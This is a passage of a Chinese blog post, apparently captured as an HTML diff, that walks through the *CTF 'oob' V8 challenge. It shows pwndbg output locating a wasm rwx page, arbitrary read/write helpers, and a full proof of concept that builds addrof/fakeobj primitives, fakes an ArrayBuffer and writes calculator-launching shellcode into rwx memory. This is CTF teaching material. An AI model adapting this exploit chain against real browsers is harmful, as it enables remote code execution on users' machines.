class="number">0x000055b83d5157f8</span>	<span class="number">0x000003ea86480c71</span></span><br><span class="line"><span class="number">0x17f0cf121870</span>:	<span class="number">0x000055b83d59f480</span>	<span class="number">0x000003ea864804d1</span></span><br><span class="line"><span class="number">0x17f0cf121880</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x17f0cf121890</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x17f0cf1218a0</span>:	<span class="number">0x000055b83d59eaf0</span>	<span class="number">0x000003ea864804d1</span></span><br><span class="line"><span class="number">0x17f0cf1218b0</span>:	<span class="number">0x000055b83d50bb30</span>	<span class="number">0x00001436a173c000</span> 🌟</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="attr">LEGEND</span>: <span class="variable constant_">STACK</span> | <span class="variable constant_">HEAP</span> | <span class="variable constant_">CODE</span> | <span class="variable constant_">DATA</span> | <span class="variable constant_">WX</span> | <span class="variable constant_">RODATA</span></span><br><span class="line">             <span class="title class_">Start</span>                <span class="title class_">End</span> <span class="title class_">Perm</span>     <span class="title class_">Size</span> <span class="title class_">Offset</span> <span class="title class_">File</span></span><br><span class="line">     <span class="number">0x10eb3a00000</span>      <span class="number">0x10eb4201000</span> rw-p   <span class="number">801000</span>      <span class="number">0</span> [anon_10eb3a00]</span><br><span class="line">     <span class="number">0x3ea86480000</span>      <span class="number">0x3ea864c0000</span> r--p    <span class="number">40000</span>      <span class="number">0</span> [anon_3ea86480]</span><br><span class="line">     <span class="number">0xf3b02f00000</span>      <span class="number">0xf3b02f40000</span> ---p    <span class="number">40000</span>      <span class="number">0</span> [anon_f3b02f00]</span><br><span class="line">    <span class="number">0x1436a173c000</span>     <span class="number">0x1436a173d000</span> rwxp     <span class="number">1000</span>      <span class="number">0</span> [anon_1436a173c] 🌟</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; vmmap <span class="number">0x00001436a173c000</span></span><br><span class="line"><span class="attr">LEGEND</span>: <span class="variable constant_">STACK</span> | <span class="variable constant_">HEAP</span> | <span class="variable constant_">CODE</span> | <span class="variable constant_">DATA</span> | <span class="variable constant_">WX</span> | <span class="variable constant_">RODATA</span></span><br><span class="line">             <span class="title class_">Start</span>                <span class="title class_">End</span> <span class="title class_">Perm</span>     <span class="title class_">Size</span> <span class="title class_">Offset</span> <span class="title class_">File</span></span><br><span class="line">     <span class="number">0xf3b02f00000</span>      <span class="number">0xf3b02f40000</span> ---p    <span class="number">40000</span>      <span class="number">0</span> [anon_f3b02f00]</span><br><span class="line">►   <span class="number">0x1436a173c000</span>     <span class="number">0x1436a173d000</span> rwxp     <span class="number">1000</span>      <span class="number">0</span> [anon_1436a173c] +<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x1436a173d000</span>     <span class="number">0x1436e173c000</span> ---p 3ffff000      <span class="number">0</span> [anon_1436a173d]</span><br><span class="line">pwndbg&gt; p/x <span class="number">0x17f0cf1218b8</span>-(<span class="number">0x17f0cf121831</span>-<span class="number">1</span>) <span class="comment">//rwx内存相对于Instance的偏移</span></span><br><span class="line">$3 = <span class="number">0x88</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>这样就可以得到偏移是0x88了</p>
+</blockquote>
+<p>接下来就需要利用之前构造的DataView来任意地址读写了，需要实现一些工具function</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);<span class="comment">//把backing store*改成要读取的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>));<span class="comment">//getFloat64函数可以获得backing store*(现在已经被替换成任意地址)中的值，第一个参数是偏移，第二个参数是大小端，true表示小端</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_64</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_ab_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);<span class="comment">//写入任意地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h3><p>实际上前面的工作就是创建一个JSArray(<code>fake_array_buffer_obj</code>)，然后为了利用ArrayBuffer的Backing Store和DataView来实现任意地址读写，<code>fake_array_buffer_obj</code>数组元素是构造好一个ArrayBuffer的内存布局，后面构造fake map等一系列操作其实就是把<code>fake_array_buffer_obj</code>的Elements改造成一个<code>ArrayBuffer</code>，这也是为什么最后得到<code>fake_array_buffer</code>时传入<code>fakeobj</code>的其实是<code>fake_array_buffer_obj</code>的Elements的address，之后在寻找wasm instance附近的权限为rwx的内存的偏移，最后只要利用这些工具类写入shellcode就行了，这里简单使用一个弹计算器的shellcode</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">        <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 32-bit unsigned integer to hex **string**</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj_param</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj_param;</span><br><span class="line">    obj_arr.<span class="title function_">oob</span>(double_arr.<span class="title function_">oob</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> double_arr = [<span class="number">1.1</span>];</span><br><span class="line">    <span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">    double_arr = double_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    obj_arr = obj_arr.<span class="title function_">splice</span>(<span class="number">0</span>);</span><br><span class="line">    double_arr[<span class="number">0</span>] = addr;</span><br><span class="line">    double_arr.<span class="title function_">oob</span>(obj_arr.<span class="title function_">oob</span>());<span class="comment">//替换map*</span></span><br><span class="line">    <span class="keyword">return</span> double_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>();<span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">let</span> fake_array_buffer_obj = [</span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//map*, properties （properties只要不去访问，设置成0也没事）</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x4000</span>), <span class="comment">//elements, length</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">2</span>), <span class="comment">//backing_store, embedder fields</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0</span>), <span class="comment">//padding, padding</span></span><br><span class="line"><span class="title function_">u2d</span>(<span class="number">0</span>), <span class="title function_">u2d</span>(<span class="number">0x1900042319080808</span>), <span class="comment">//fake map</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_">gc</span>();<span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">let</span> fake_obj_elements_addr = <span class="title function_">addrof</span>(fake_array_buffer_obj) + <span class="number">0x48</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake obj elements addr is:&quot;</span>+<span class="title function_">hex</span>(fake_obj_elements_addr));</span><br><span class="line"><span class="keyword">let</span> array_buffer_obj_map_addr = fake_obj_elements_addr + <span class="number">64</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake array buffer&#x27;s map addr is:&quot;</span>+<span class="title function_">hex</span>( array_buffer_obj_map_addr));</span><br><span class="line">fake_array_buffer_obj[<span class="number">0</span>]=<span class="title function_">u2d</span>(array_buffer_obj_map_addr);<span class="comment">//fake map的地址替换</span></span><br><span class="line"><span class="keyword">let</span> fake_array_buffer = <span class="title function_">fakeobj</span>(<span class="title function_">u2d</span>(fake_obj_elements_addr));<span class="comment">//fake obj会利用类型混淆，把传入的地址当作HeapObject Pointer解析</span></span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,<span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>,<span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);<span class="comment">//一个简单的main函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_i_addr = <span class="title function_">addrof</span>(wasm_instance);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_32</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getUint32</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);<span class="comment">//把backing store*改成要读取的地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(dv.<span class="title function_">getFloat64</span>(<span class="number">0</span>, <span class="literal">true</span>));<span class="comment">//getFloat64函数可以获得backing store*(现在已经被替换成任意地址)中的值，第一个参数是偏移，第二个参数是大小端，true表示小端</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_64</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    fake_array_buffer_obj[<span class="number">4</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);<span class="comment">//写入任意地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">get_64</span>((wasm_i_addr + <span class="number">0x88</span> - <span class="number">1</span>)); <span class="comment">//-1是因为Tagged Value</span></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;[+] rwx_addr : &#x27;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(<span class="number">21</span>);</span><br><span class="line">sc[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">sc[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">sc[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">sc[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">sc[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">sc[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">sc[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">sc[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">sc[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">sc[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">sc[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">sc[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">sc[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">sc[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">sc[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">sc[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">sc[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">sc[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">sc[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">sc[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">sc[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.<span class="property">length</span>; i++) &#123;</span><br><span class="line"><span class="title function_">set_32</span>(rwx_addr + i * <span class="number">4</span>, sc[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>();<span class="comment">//最后调用一下wasm实例化的main函数，来触发shellcode</span></span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到弹计算器成功了</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20241115181021063.png"
+                      alt="image-20241115181021063"
+                ><figcaption>image-20241115181021063</figcaption></figure></p>
+<blockquote>
+<p>m系列mac上用UTM运行的x86虚拟机UI界面实在太卡了，ssh连接更方便点</p>
+</blockquote>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> V8-pwn入门(2)——[*CTF]oob</li>
+        <li><strong>作者:</strong> Sl0th</li>
+        <li><strong>创建于
+                :</strong> 2024-11-14 12:52:03</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-11-21 16:00:54
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://sl0th.top/2024/11/14/V8-pwn入门-2-——-CTF-oob/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/js-engine/">#js-engine</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/v8/">#v8</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/11/17/V8-pwn%E5%85%A5%E9%97%A8-3-%E2%80%94%E2%80%94Inline-Cache%E3%80%81GC%E3%80%81JIT/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">V8-pwn入门(3)——Inline-Cache、GC、JIT</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/12/V8-pwn%E5%85%A5%E9%97%A8-1-%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E3%80%81%E7%89%B9%E6%80%A7/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">V8-pwn入门(1)——对象模型、特性</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">目录</div>
+        <div class="page-title">V8-pwn入门(2)——[*CTF]oob</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%F0%9F%94%A7"><span class="nav-text">0x00 环境配置🔧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#oob-diff"><span class="nav-text">oob.diff</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-patch%E5%88%86%E6%9E%90%F0%9F%A7%90"><span class="nav-text">0x01 patch分析🧐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%F0%9F%90%9E"><span class="nav-text">0x02 调试方法🐞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%F0%9F%94%8D"><span class="nav-text">0x03 漏洞分析🔍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#oob%E4%BD%BF%E7%94%A8"><span class="nav-text">oob使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E8%AF%AD%E6%9E%84%E9%80%A0"><span class="nav-text">原语构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0object%E4%BE%8B%E5%AD%90%F0%9F%8C%B0"><span class="nav-text">伪造object例子🌰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97fake-map%E5%81%8F%E7%A7%BB"><span class="nav-text">计算fake map偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wasm%E5%86%99shellcode"><span class="nav-text">wasm写shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4POC"><span class="nav-text">完整POC</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sl0th</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 47 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
